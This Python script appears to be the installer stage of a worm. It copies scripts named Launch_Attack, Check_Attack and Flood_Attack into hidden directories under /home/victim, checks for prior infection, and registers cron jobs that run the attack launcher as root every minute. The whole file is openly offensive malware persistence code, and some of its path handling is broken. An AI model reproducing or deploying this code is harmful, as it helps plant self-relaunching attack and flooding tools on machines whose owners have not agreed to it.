import os
import sys
from crontab import CronTab


attackDirs = ['/home/victim/.etc', '/home/victim/.var']
attackFiles = ['/Launch_Attack.py', '/Check_Attack.py', '/Flood_Attack.py']


def set_up_crontab():
    cron = CronTab(user=True)

    if not cron.find_comment('etc worm attack'):
        job1 = cron.new(command='sudo /usr/bin/python /home/victim/.etc/.module/Launch_Attack.py',
                        comment='etc worm attack')
        job1.setall('*/1 * * * *')

    if not cron.find_comment('var worm attack'):
        job2 = cron.new(command='sudo /usr/bin/python /home/victim/.var/.module/Launch_Attack.py',
                        comment='var worm attack')
        job2.setall('*/1 * * * *')

    cron.write()

    return


def set_up_attack():
    if is_infect():
        return

    # Make directories
    for attackDir in attackDirs:
        os.system('sudo mkdir {0}'.format(attackDir))
        os.system('sudo mkdir {0}/.module')
        os.system('sudo cp a.py {0}/.module/Launch_Attack.py'.format(attackDir))
        os.system('sudo cp b.py {0}/.module/Check_Attack.py'.format(attackDir))
        os.system('sudo cp c.py {0}/.module/Flood_Attack.py'.format(attackDir))


def is_infect():
    for attackDir in attackDirs:
        for attackFile in attackFiles:
            if not os.path.isfile(attackDir+attackFile):
                return False

    return True


def is_root():
    return os.geteuid() == 0


if __name__ == '__main__':

    if not is_root():
        sys.exit('You must run the script with \'sudo\'')

    set_up_attack()
    set_up_crontab()
